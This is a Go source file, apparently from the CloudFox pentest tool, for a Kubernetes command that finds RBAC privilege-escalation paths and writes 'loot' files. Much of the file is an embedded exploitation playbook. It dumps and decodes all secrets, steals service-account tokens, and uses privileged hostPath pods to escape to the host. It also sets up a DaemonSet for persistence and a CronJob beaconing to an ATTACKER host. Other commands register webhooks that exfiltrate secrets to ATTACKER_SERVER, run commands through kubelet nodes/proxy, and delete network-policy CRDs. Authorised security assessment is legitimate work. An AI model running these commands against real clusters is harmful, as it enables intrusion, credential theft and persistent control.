package commands

import (
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	attackpathservice "github.com/BishopFox/cloudfox/kubernetes/services/attackpathService"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
)

var PrivescCmd = &cobra.Command{
	Use:     "privesc",
	Aliases: []string{"pe", "escalate", "priv"},
	Short:   "Identify privilege escalation paths in Kubernetes RBAC",
	Long: `Analyze Kubernetes RBAC to identify privilege escalation opportunities.

This module examines ClusterRoleBindings and RoleBindings to find principals
with dangerous permissions that could be used to escalate privileges.

Detected privilege escalation methods (30+) include:

RBAC Escalation:
- Cluster-admin equivalent (wildcard verbs/resources)
- ClusterRoleBinding/RoleBinding creation
- Bind/Escalate verbs (bypass RBAC restrictions)
- Role/ClusterRole modification

Impersonation:
- User impersonation (including system:admin)
- Group impersonation (including system:masters)
- ServiceAccount impersonation

Pod-Based Escalation:
- Create pods with privileged security context
- Create pods with hostPath, hostPID, hostNetwork
- Exec into existing pods
- Create workloads (Deployments, DaemonSets, Jobs) with elevated SAs

Token/Credential Theft:
- ServiceAccount token generation
- Secret access (SA tokens, TLS certs)

Node Access:
- Node creation/modification
- Kubelet API proxy access

Webhook Abuse:
- Mutating webhook creation (inject malicious content)
- Validating webhook creation (intercept/block requests)

Usage:
  cloudfox kubernetes privesc`,
	Run: runPrivescCommand,
}

type PrivescOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o PrivescOutput) TableFiles() []internal.TableFile { return o.Table }
func (o PrivescOutput) LootFiles() []internal.LootFile   { return o.Loot }

type PrivescModule struct {
	// All paths from combined analysis
	AllPaths       []attackpathservice.AttackPath
	ClusterPaths   []attackpathservice.AttackPath
	NamespacePaths map[string][]attackpathservice.AttackPath
	Namespaces     []string

	// Loot
	LootContent string
}

func runPrivescCommand(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	// Validate authentication first
	if err := sdk.ValidateAuth(ctx); err != nil {
		logger.ErrorM(fmt.Sprintf("Authentication failed:\n%v", err), globals.K8S_PRIVESC_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Analyzing privilege escalation paths for %s", globals.ClusterName), globals.K8S_PRIVESC_MODULE_NAME)

	// Initialize attack path service
	svc, err := attackpathservice.New()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to initialize attack path service: %v", err), globals.K8S_PRIVESC_MODULE_NAME)
		return
	}
	svc.SetModuleName(globals.K8S_PRIVESC_MODULE_NAME)

	// Run analysis
	result, err := svc.CombinedAnalysis(ctx, "privesc")
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to analyze privilege escalation: %v", err), globals.K8S_PRIVESC_MODULE_NAME)
		return
	}

	module := &PrivescModule{
		AllPaths:       result.AllPaths,
		ClusterPaths:   result.ClusterPaths,
		NamespacePaths: result.NamespacePaths,
		Namespaces:     result.Namespaces,
	}

	if len(module.AllPaths) == 0 {
		logger.InfoM("No privilege escalation paths found", globals.K8S_PRIVESC_MODULE_NAME)
		return
	}

	// Count by scope and risk
	clusterCount := len(module.ClusterPaths)
	namespaceCount := len(module.AllPaths) - clusterCount
	riskCounts := countRiskLevels(module.AllPaths)

	logger.SuccessM(fmt.Sprintf("Found %d privilege escalation path(s): %d cluster-level, %d namespace-level",
		len(module.AllPaths), clusterCount, namespaceCount), globals.K8S_PRIVESC_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
		riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low), globals.K8S_PRIVESC_MODULE_NAME)

	// Generate output
	tables := module.buildTables()
	loot := module.generateLoot()

	output := PrivescOutput{
		Table: tables,
		Loot:  loot,
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"privesc",
		globals.ClusterName,
		"results",
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.K8S_PRIVESC_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PRIVESC_MODULE_NAME), globals.K8S_PRIVESC_MODULE_NAME)
}

func (m *PrivescModule) buildTables() []internal.TableFile {
	headers := []string{
		"Risk Level",
		"Source",
		"Scope",
		"Principal",
		"Principal Type",
		"Method",
		"Target Resource",
		"Permissions",
		"Role",
		"Binding",
		"Description",
	}

	var body [][]string

	// Sort by risk level (CRITICAL first)
	sortedPaths := make([]attackpathservice.AttackPath, len(m.AllPaths))
	copy(sortedPaths, m.AllPaths)
	sort.Slice(sortedPaths, func(i, j int) bool {
		return shared.RiskLevelValue(sortedPaths[i].RiskLevel) > shared.RiskLevelValue(sortedPaths[j].RiskLevel)
	})

	for _, path := range sortedPaths {
		scope := path.ScopeName
		if path.ScopeType == "cluster" {
			scope = "cluster-wide"
		}
		source := path.SourceType
		if source == "" {
			source = "core"
		}

		body = append(body, []string{
			path.RiskLevel,
			source,
			scope,
			path.Principal,
			path.PrincipalType,
			path.Method,
			path.TargetResource,
			strings.Join(path.Permissions, ", "),
			path.RoleName,
			path.BindingName,
			path.Description,
		})
	}

	return []internal.TableFile{
		{
			Name:   "Privesc",
			Header: headers,
			Body:   body,
		},
	}
}

func (m *PrivescModule) generateLoot() []internal.LootFile {
	var lootContent []string

	lootContent = append(lootContent, "#####################################")
	lootContent = append(lootContent, "##### Kubernetes Privilege Escalation Commands")
	lootContent = append(lootContent, "##### Generated by CloudFox")
	lootContent = append(lootContent, "#####################################")
	lootContent = append(lootContent, "")

	riskCounts := countRiskLevels(m.AllPaths)
	lootContent = append(lootContent, fmt.Sprintf("# Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
		riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low))
	lootContent = append(lootContent, "")

	// Group paths by risk level
	criticalPaths := filterByRisk(m.AllPaths, shared.RiskCritical)
	highPaths := filterByRisk(m.AllPaths, shared.RiskHigh)

	// CRITICAL section
	if len(criticalPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### CRITICAL - Immediate privilege escalation paths")
		lootContent = append(lootContent, "")
		for _, path := range criticalPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] Principal: %s (%s)", path.RiskLevel, path.Principal, path.PrincipalType))
			lootContent = append(lootContent, fmt.Sprintf("# Method: %s", path.Method))
			lootContent = append(lootContent, fmt.Sprintf("# Scope: %s", path.ScopeName))
			lootContent = append(lootContent, fmt.Sprintf("# Role: %s via %s", path.RoleName, path.BindingName))
			lootContent = append(lootContent, fmt.Sprintf("# Description: %s", path.Description))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}
	}

	// HIGH section
	if len(highPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### HIGH - Significant privilege escalation paths")
		lootContent = append(lootContent, "")
		for _, path := range highPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] Principal: %s (%s)", path.RiskLevel, path.Principal, path.PrincipalType))
			lootContent = append(lootContent, fmt.Sprintf("# Method: %s", path.Method))
			lootContent = append(lootContent, fmt.Sprintf("# Scope: %s", path.ScopeName))
			lootContent = append(lootContent, fmt.Sprintf("# Role: %s via %s", path.RoleName, path.BindingName))
			lootContent = append(lootContent, fmt.Sprintf("# Description: %s", path.Description))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}
	}

	// Group by method for easy exploitation
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "### GROUPED BY METHOD")
	lootContent = append(lootContent, "")

	methodGroups := groupByMethod(m.AllPaths)
	for method, paths := range methodGroups {
		lootContent = append(lootContent, fmt.Sprintf("## %s (%d paths)", method, len(paths)))
		for _, path := range paths {
			lootContent = append(lootContent, fmt.Sprintf("# %s - %s (%s)", path.Principal, path.RoleName, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
		}
		lootContent = append(lootContent, "")
	}

	// Build playbook content
	playbookContent := m.generatePlaybook(methodGroups)

	return []internal.LootFile{
		{
			Name:     "Privesc-Loot",
			Contents: strings.Join(lootContent, "\n"),
		},
		{
			Name:     "Privesc-Playbook",
			Contents: playbookContent,
		},
	}
}

// generatePlaybook creates a reference-style exploitation guide organized by permission type
func (m *PrivescModule) generatePlaybook(methodGroups map[string][]attackpathservice.AttackPath) string {
	var content []string

	content = append(content, "#####################################")
	content = append(content, "##### Privilege Escalation Playbook")
	content = append(content, "##### Reference Guide by Permission Type")
	content = append(content, "#####################################")
	content = append(content, "")

	// Secret Access
	content = append(content, `
##############################################
## SECRET ACCESS
##############################################
# Can read/write secrets - steal credentials, tokens, certificates`)
	if entities := getEntitiesForMethods(methodGroups, "Secrets", "Token Theft"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with secret access")
	}
	content = append(content, `
# List all secrets:
kubectl get secrets -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type'

# Extract and decode all secrets:
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | map_values(@base64d))"'

# Get SA tokens specifically:
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'

# Decode a specific secret:
kubectl get secret SECRET_NAME -n NAMESPACE -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value | @base64d)"'`)

	// Pod Creation
	content = append(content, `

##############################################
## POD CREATION
##############################################
# Can create pods - container escape, node access, SA token theft`)
	if entities := getEntitiesForMethods(methodGroups, "Pod Creation"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with pod creation permissions")
	}
	content = append(content, `
# Create privileged pod with host access:
kubectl run privesc --image=alpine --restart=Never --overrides='{
  "spec":{
    "hostNetwork":true,"hostPID":true,"hostIPC":true,
    "containers":[{
      "name":"privesc","image":"alpine",
      "command":["sh","-c","sleep 3600"],
      "securityContext":{"privileged":true},
      "volumeMounts":[{"name":"host","mountPath":"/host"}]
    }],
    "volumes":[{"name":"host","hostPath":{"path":"/"}}]
  }
}' -- sleep 3600

# Escape to host:
kubectl exec -it privesc -- chroot /host

# Create pod with specific SA to steal its token:
kubectl run token-steal --image=alpine --restart=Never --overrides='{
  "spec":{
    "serviceAccountName":"TARGET_SA",
    "containers":[{
      "name":"steal","image":"alpine",
      "command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]
    }]
  }
}'`)

	// Pod Exec
	content = append(content, `

##############################################
## POD EXEC/ATTACH
##############################################
# Can exec into running pods - lateral movement, token theft`)
	if entities := getEntitiesForMethods(methodGroups, "Pod Exec", "Pod Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with pod exec permissions")
	}
	content = append(content, `
# Find interesting pods:
kubectl get pods -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SA:.spec.serviceAccountName,NODE:.spec.nodeName'

# Exec into pod:
kubectl exec -it POD_NAME -n NAMESPACE -- /bin/sh

# Extract SA token from inside pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check what the SA can do:
kubectl auth can-i --list

# Port forward to access internal services:
kubectl port-forward POD_NAME 8080:80 -n NAMESPACE`)

	// Workload Creation
	content = append(content, `

##############################################
## WORKLOAD CREATION
##############################################
# Can create deployments/daemonsets/jobs - persistence, lateral movement`)
	if entities := getEntitiesForMethods(methodGroups, "Workload Creation", "Workload Modification"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with workload creation permissions")
	}
	content = append(content, `
# Create DaemonSet for node-wide persistence (runs on ALL nodes):
cat <<'EOF' | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: persistence
spec:
  selector:
    matchLabels: {app: persistence}
  template:
    metadata:
      labels: {app: persistence}
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: shell
        image: alpine
        command: ["sh", "-c", "while true; do sleep 3600; done"]
        securityContext: {privileged: true}
        volumeMounts: [{name: host, mountPath: /host}]
      volumes: [{name: host, hostPath: {path: /}}]
EOF

# Create CronJob for persistent callback:
cat <<'EOF' | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: beacon
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: beacon
            image: alpine
            command: ["sh", "-c", "wget -q -O- http://ATTACKER/beacon?node=$(hostname)"]
          restartPolicy: Never
EOF`)

	// Node Access
	content = append(content, `

##############################################
## NODE ACCESS
##############################################
# Can create/modify/proxy nodes - RCE on any pod, secret theft`)
	if entities := getEntitiesForMethods(methodGroups, "Node Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with node access permissions")
	}
	content = append(content, `
# nodes/proxy RCE - execute commands on ANY pod via kubelet API
# Reference: grahamhelton.com/blog/nodes-proxy-rce

# 1. Get a token:
TOKEN=$(kubectl create token default)

# 2. Get node internal IPs:
kubectl get nodes -o wide

# 3. List all pods on a node:
curl -sk -H "Authorization: Bearer $TOKEN" https://NODE_IP:10250/pods

# 4. Execute command on any pod (RCE):
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://NODE_IP:10250/exec/NAMESPACE/POD/CONTAINER?output=1&error=1&command=id"

# Register rogue node to intercept secrets:
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Node
metadata:
  name: rogue-node
  labels:
    kubernetes.io/os: linux
EOF`)

	// Admission Webhooks
	content = append(content, `

##############################################
## ADMISSION WEBHOOKS
##############################################
# Can create/modify webhooks - intercept all API requests, inject sidecars`)
	if entities := getEntitiesForMethods(methodGroups, "Webhook"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with webhook permissions")
	}
	content = append(content, `
# Create mutating webhook to inject sidecar into all pods:
cat <<'EOF' | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: inject-sidecar
webhooks:
- name: inject.attacker.com
  clientConfig:
    url: "https://ATTACKER_SERVER/mutate"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    resources: ["pods"]
    apiVersions: ["v1"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
EOF

# Create validating webhook to exfiltrate secrets on creation:
cat <<'EOF' | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: exfil-secrets
webhooks:
- name: exfil.attacker.com
  clientConfig:
    url: "https://ATTACKER_SERVER/validate"
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    resources: ["secrets"]
    apiVersions: ["v1"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
EOF`)

	// Token Creation
	content = append(content, `

##############################################
## TOKEN CREATION
##############################################
# Can create SA tokens - impersonate any service account`)
	if entities := getEntitiesForMethods(methodGroups, "Token Creation"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with token creation permissions")
	}
	content = append(content, `
# Generate token for any SA:
kubectl create token TARGET_SA -n TARGET_NAMESPACE

# Generate long-lived token:
kubectl create token TARGET_SA -n TARGET_NAMESPACE --duration=8760h

# Use the token:
kubectl --token="$TOKEN" auth can-i --list
kubectl --token="$TOKEN" get secrets -A`)

	// Storage Access
	content = append(content, `

##############################################
## STORAGE ACCESS
##############################################
# Can create PVs/PVCs - access node filesystem, steal data`)
	if entities := getEntitiesForMethods(methodGroups, "Storage"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with storage permissions")
	}
	content = append(content, `
# Create hostPath PV to access entire node filesystem:
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: PersistentVolume
metadata:
  name: node-root
spec:
  capacity:
    storage: 100Gi
  accessModes:
    - ReadWriteOnce
  hostPath:
    path: /
    type: Directory
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: node-root-claim
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 100Gi
  volumeName: node-root
EOF

# Mount in a pod:
kubectl run storage-access --image=alpine --restart=Never --overrides='{
  "spec":{
    "containers":[{
      "name":"access","image":"alpine",
      "command":["sleep","3600"],
      "volumeMounts":[{"name":"node","mountPath":"/node"}]
    }],
    "volumes":[{"name":"node","persistentVolumeClaim":{"claimName":"node-root-claim"}}]
  }
}'`)

	// CRD Management
	content = append(content, `

##############################################
## CRD MANAGEMENT
##############################################
# Can create/modify CRDs - inject data into controllers, bypass validation`)
	if entities := getEntitiesForMethods(methodGroups, "CRD Management", "CRD Resource Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with CRD management permissions")
	}
	content = append(content, `
# Create CRD without validation (inject arbitrary data):
cat <<'EOF' | kubectl apply -f -
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: exploits.attacker.example.com
spec:
  group: attacker.example.com
  names:
    kind: Exploit
    plural: exploits
  scope: Namespaced
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        x-kubernetes-preserve-unknown-fields: true
EOF

# Remove validation from existing CRD:
kubectl patch crd TARGET_CRD --type=json -p='[{
  "op":"replace",
  "path":"/spec/versions/0/schema/openAPIV3Schema",
  "value":{"type":"object","x-kubernetes-preserve-unknown-fields":true}
}]'

# Delete security policy CRDs to weaken controls:
kubectl delete crd networkpolicies.crd.projectcalico.org`)

	return strings.Join(content, "\n")
}

// getEntitiesForMethods returns unique entities that have any of the specified methods
func getEntitiesForMethods(methodGroups map[string][]attackpathservice.AttackPath, methods ...string) []string {
	seen := make(map[string]bool)
	var entities []string

	for _, method := range methods {
		if paths, ok := methodGroups[method]; ok {
			for _, path := range paths {
				key := fmt.Sprintf("%s:%s", path.PrincipalType, path.Principal)
				if !seen[key] {
					seen[key] = true
					entities = append(entities, fmt.Sprintf("%s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
				}
			}
		}
	}

	return entities
}

// Helper functions

func countRiskLevels(paths []attackpathservice.AttackPath) *shared.RiskCounts {
	counts := shared.NewRiskCounts()
	for _, path := range paths {
		counts.Add(path.RiskLevel)
	}
	return counts
}

func filterByRisk(paths []attackpathservice.AttackPath, riskLevel string) []attackpathservice.AttackPath {
	var filtered []attackpathservice.AttackPath
	for _, path := range paths {
		if path.RiskLevel == riskLevel {
			filtered = append(filtered, path)
		}
	}
	return filtered
}

func groupByMethod(paths []attackpathservice.AttackPath) map[string][]attackpathservice.AttackPath {
	groups := make(map[string][]attackpathservice.AttackPath)
	for _, path := range paths {
		groups[path.Method] = append(groups[path.Method], path)
	}
	return groups
}
